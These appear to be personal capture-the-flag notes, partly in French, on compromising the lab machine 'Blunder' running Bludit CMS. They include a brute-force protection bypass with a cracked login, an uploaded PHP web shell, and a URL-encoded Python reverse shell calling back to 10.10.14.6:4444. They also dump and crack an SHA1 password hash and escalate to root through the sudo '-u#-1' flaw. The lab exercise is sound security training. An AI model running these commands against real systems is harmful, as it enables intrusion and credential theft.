cms : BLUDIT

todo.txt 

-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING

/bl-kernel
/bl-plugins
/bl-content
/admin
```
https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb
```
use the exploit.py to bypass bruteforce protection 
```
python3 exploit2.py 10.10.10.191 fergus customlist.txt
```
use cewl to create a wordlist based on the webpage
```
ruby cewl.rb -w customlist.txt -d 5 http://10.10.10.191
```
SUCCESS: Password found!
Use fergus:RolandDeschain to login.

upload de fichiers 
```
see request_shell.burp
```
ensuite aller /bl-content
```
http://10.10.10.191/bl-content/tmp/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.6%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
```
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
on decode le password (sha1)
```
faca404fd5c0a31cf1897b823c695c85cffeb98d
hashid = sha1
sha1 decrypt: Password120
```

```
sudo -l 
```
User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

google nous explique
```
https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability
```
```
hugo@blunder:/tmp$ sudo -u#-1 /bin/bash
root@blunder:/tmp#
```
Rooted !
